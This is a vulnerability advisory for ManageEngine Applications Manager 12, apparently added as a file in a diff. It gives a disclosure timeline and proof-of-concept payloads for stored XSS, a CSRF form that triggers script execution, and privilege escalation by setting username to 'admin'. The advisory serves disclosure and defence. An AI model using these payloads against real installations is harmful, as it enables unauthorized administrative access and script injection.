@@ -1,0 +1,118 @@
+Manage Engine Applications Manager 12 Multiple Vulnerabilities
+
+
+[Vendor Product Description]
+
+- ManageEngine Applications Manager is an application performance monitoring solution that proactively monitors 
+business applications and help businesses ensure their revenue-critical applications meet end user expectations. 
+Applications Manager offers out-of-the-box monitoring support for 50+ applications and servers.
+
+
+- Site: https://www.manageengine.com/
+
+
+[Advisory Timeline]
+
+- 22/10/2015 -> First Contact to Vendor;
+- 23/10/2015 -> Vendor responded asking for details;
+- 23/10/2015 -> Advisory & Details sent to vendor;
+- 03/11/2015 -> Follow up with the vendor. No response received;
+- 06/11/2015 -> Second follow up with the vendor. No response received;
+- 22/12/2015 -> Final follow up with the vendor. No response received;
+- 13/01/2016 -> Public security advisory released;
+
+
+[Bug Summary]
+
+- Cross Site Scripting (Stored) (CVE-ID Requested)
+
+- Cross Site Request Forgery (CSRF) (CVE-ID Requested)
+
+- Privilege Escalation (CVE-ID Requested)
+
+
+[Impact]
+
+- High
+
+
+[Affected Version]
+
+- Applications Manager 12 
+
+
+[Advisory]
+
+- ZSL-2016-5292
+- http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5292.php
+
+
+[Bug Description and Proof of Concept]
+
+1. Cross-Site Request Forgery (CSRF) - The application allows users to perform certain actions via HTTP requests 
+without performing any validity checks to verify the requests. This can be exploited to perform certain actions 
+with administrative privileges if a logged-in user visits a malicious web site
+https://en.wikipedia.org/wiki/Cross-site_request_forgery
+
+2. Cross Site Scripting (XSS) - Multiple cross-site scripting vulnerabilities were also discovered. The issue is 
+triggered when input passed via the multiple parameters is not properly sanitized before being returned to the user. 
+This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.
+https://en.wikipedia.org/wiki/Cross-site_scripting
+
+3. Vertical Privilege Escalation - Applications Manager 12 suffers from a privilege escalation issue. Normal user can elevate his/her 
+privileges by modifying a GET request seting the parameter 'username' to 'admin'. Attacker can exploit this issue using also 
+cross-site request forgery attacks.
+https://en.wikipedia.org/wiki/Privilege_escalation
+
+
+[Proof-of-Concept]
+
+1. Multiple Stored Cross Site Scripting
+
+Parameter:
+description (POST)
+
+Payload:
+option=org.apache.struts.taglib.html.TOKEN=05b70e70fce2ede0d6efc8aef01b1519&addmonitors=0&name=%3Cscript%3Ealert%285%29%3C%2Fscript%3E&description=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&allowners_list=1&grouptype=1&createMV=createMV&mgtypestatus%231001=on&mgtypes_1001=1&mgtypes_1007=0&mgtypes_1008=0&mgtypestatus%231002=on&mgtypes_1002=1&mgtypestatus%231003=on&mgtypes_1003=1&mgtypestatus%231004=on&mgtypes_1004=1&mgtypestatus%231006=on&mgtypes_1006=1&locationid=1
+
+Parameters:
+leftexp1, rightexp1, leftexp2, rightexp2 (POST)
+
+Payload: haid=null&method=editAnomalyProfileAction&id=0&secondarycriticalexist=false&secondarywarningexist=false&secondaryinfoexist=false&select=thresholdNumeric&displayname=&criticalthresholdcondition=GT&criticalthresholdvalue=5&criticalconditionjoiner=OR&secondarycriticalthresholdcondition=GT&secondarycriticalthresholdvalue=5&criticalthresholdmessage=Critical+Alarm+Message&consecutive_mincriticalpolls=Use+global+defaults&consecutive_criticalpolls=Use+global+defaults&warningthresholdcondition=EQ&warningthresholdvalue=5&warningconditionjoiner=OR&secondarywarningthresholdcondition=EQ&secondarywarningthresholdvalue=5&warningthresholdmessage=Warning+Alarm+Message&consecutive_minwarningpolls=Use+global+defaults&consecutive_warningpolls=Use+global+defaults&infothresholdcondition=LT&infothresholdvalue=5&infoconditionjoiner=OR&secondaryinfothresholdcondition=LT&secondaryinfothresholdvalue=5&infothresholdmessage=Clear+Alarm+message&consecutive_minclearpolls=Use+global+defaults&consecutive_clearpolls=
+Use+global+defaults&description=&cancel=true&percentagevalue=1&anomalyId=10000001&anomalyName=%26lt%3Bscript%26gt%3Balert%26%2340%3B1%29%26lt%3B%2Fscript%26gt%3B&baseformulaType=0&baselineType=1&baseWeek=1&monthYears=8-2015&higherPercentage=1&higherValue=20&alarmType=1&lowerValue=30&loweralarmType=4&sendmail=0&comparisonType=1&leftexp1=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&leftselect=%3E&rightexp1=%3Cscript%3Ealert%283%29%3C%2Fscript%3E&alarmTypeExpression=1&leftexp2=%3Cscript%3Ealert%284%29%3C%2Fscript%3E&rightselect=%3E&rightexp2=%3Cscript%3Ealert%285%29%3C%2Fscript%3E&loweralarmTypeExpression=4&anomalymethod=editAnomalyProfileAction&cancel1=true
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+2. Multiple Cross Site Request Forgery (CSRF)
+
+Sample Payload for executing command:
+
+<html>
+  <body>
+    <form action="http://localhost:9090/common/executeScript.do">
+      <input type="hidden" name="method" value="testAction" />
+      <input type="hidden" name="actionID" value="10000010" />
+      <input type="hidden" name="haid" value="null" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+3. Privilege Escalation on userconfiguration.do (Become an Admin)
+
+Parameter:
+username (GET)
+
+Payload:
+[Original]
+http://localhost:9090/userconfiguration.do?method=editUser&username=test1&userid=10000003
+
+[Escalated Privileges]
+http://localhost:9090/userconfiguration.do?method=editUser&username=admin&userid=10000003
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+All flaws described here were discovered and researched by:
+
+Bikramaditya Guha aka "PhoenixX"
+********************************************************************************************************************************************************************************************************************************
